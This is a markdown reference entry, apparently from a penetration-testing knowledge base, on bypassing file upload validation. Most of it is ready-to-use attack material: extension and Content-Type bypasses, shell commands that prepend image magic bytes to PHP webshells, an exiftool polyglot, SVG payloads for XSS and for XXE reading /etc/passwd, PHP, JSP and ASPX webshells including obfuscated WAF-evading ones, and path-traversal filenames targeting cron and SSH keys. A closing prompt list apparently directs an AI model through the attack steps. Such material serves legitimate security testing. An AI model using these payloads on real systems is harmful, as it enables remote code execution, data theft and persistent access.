---
id: "file-upload"
title: "File Upload Vulnerabilities - Bypass & Exploitation"
type: "technique"
category: "web-application"
subcategory: "file-upload"
tags: ["file-upload", "webshell", "bypass", "polyglot", "extension", "magic-bytes", "content-type"]
difficulty: "intermediate"
platforms: ["linux", "macos", "windows"]
related: ["command-injection-payloads", "xxe", "ssti-payloads"]
updated: "2026-03-30"
---

## Overview

File upload vulnerabilities allow attackers to upload malicious files that get executed server-side (webshells, RCE) or client-side (stored XSS, XXE). Nearly every web app has file uploads — profile pictures, documents, CSV imports, attachments. The key is bypassing validation to get your file executed.

## Extension Bypass Techniques

```
# Case variation
shell.pHp, shell.Php, shell.PHP

# Double extension
shell.php.jpg, shell.php.png, shell.jpg.php

# Null byte (PHP < 5.3.4)
shell.php%00.jpg, shell.php\x00.jpg

# Alternate PHP extensions
shell.php3, shell.php4, shell.php5, shell.phtml, shell.pht, shell.phps, shell.phar

# Alternate ASP extensions
shell.asp, shell.aspx, shell.ashx, shell.asmx, shell.cer

# Alternate JSP extensions
shell.jsp, shell.jspx, shell.jsw, shell.jsv

# Semicolon (IIS)
shell.asp;.jpg

# URL encoding
shell.p%68p

# Right-to-left override (Unicode)
shell.%E2%80%AEphp.jpg  →  displays as shell.gpj.php

# .htaccess upload (Apache)
# Upload .htaccess with: AddType application/x-httpd-php .jpg
# Then upload shell.jpg (executed as PHP)

# web.config upload (IIS)
# Add handler for custom extension
```

## Content-Type Bypass

```http
# Change Content-Type header
Content-Type: image/jpeg        # Even if uploading .php
Content-Type: image/png
Content-Type: image/gif
Content-Type: application/octet-stream

# Double boundary
Content-Type: multipart/form-data; boundary=--123; boundary=--456
```

## Magic Bytes / File Signature Bypass

```bash
# Prepend valid image magic bytes to PHP shell
# GIF89a header
echo -n 'GIF89a' > shell.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.php

# PNG header
printf '\x89PNG\r\n\x1a\n' > shell.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.php

# JPEG header
printf '\xff\xd8\xff\xe0' > shell.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.php

# PDF header
echo '%PDF-1.5' > shell.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.php
```

## Polyglot Files

```bash
# JPEG + PHP polyglot (valid JPEG that's also valid PHP)
# Use exiftool to inject PHP into JPEG comment
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg image.php.jpg

# SVG with XSS
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg">
<script>alert(document.domain)</script>
</svg>

# SVG with XXE
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
<text>&xxe;</text>
</svg>

# HTML file (stored XSS)
<html><body><script>alert(document.cookie)</script></body></html>
# Save as .html, .htm, .svg, .xml
```

## Webshells

```php
# PHP one-liners
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php passthru($_REQUEST['cmd']); ?>
<?=`$_GET[cmd]`?>

# PHP obfuscated (bypass WAF)
<?php $a='sys'.'tem'; $a($_GET['c']); ?>
<?php eval(base64_decode('c3lzdGVtKCRfR0VUWydjJ10pOw==')); ?>
```

```jsp
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
```

```aspx
<%@ Page Language="C#" %><%System.Diagnostics.Process.Start("cmd.exe","/c " + Request["cmd"]);%>
```

## Race Conditions in Upload

```
1. Upload legitimate file → passes validation
2. Immediately overwrite with malicious file before app processes
3. Or: upload malicious file, access it before cleanup runs
```

## Path Traversal in Filename

```
# Upload with traversal filename to overwrite critical files
filename="../../../etc/cron.d/shell"
filename="../../.ssh/authorized_keys"
filename="../app/views/index.php"

# URL-encoded
filename="..%2f..%2f..%2fshell.php"
```

## Deep Dig Prompts

```
Given this file upload endpoint [describe allowed types, validation, storage]:
1. Test every extension bypass technique for the server technology.
2. Attempt Content-Type manipulation and magic byte prepending.
3. Upload SVG/HTML for stored XSS, XML/DOCX for XXE.
4. Check if uploaded files are served from the same origin (enables stored XSS).
5. Test path traversal in filename parameter.
6. Check for race conditions between upload and validation.
7. If .htaccess/.web.config can be uploaded, use to enable execution of arbitrary extensions.
```

## Tools

- **Burp Suite** — Upload Scanner extension
- **exiftool** — Inject payloads into image metadata
- **fuxploider** — Automated file upload exploitation
- **Upload Scanner** — Burp extension for file upload testing
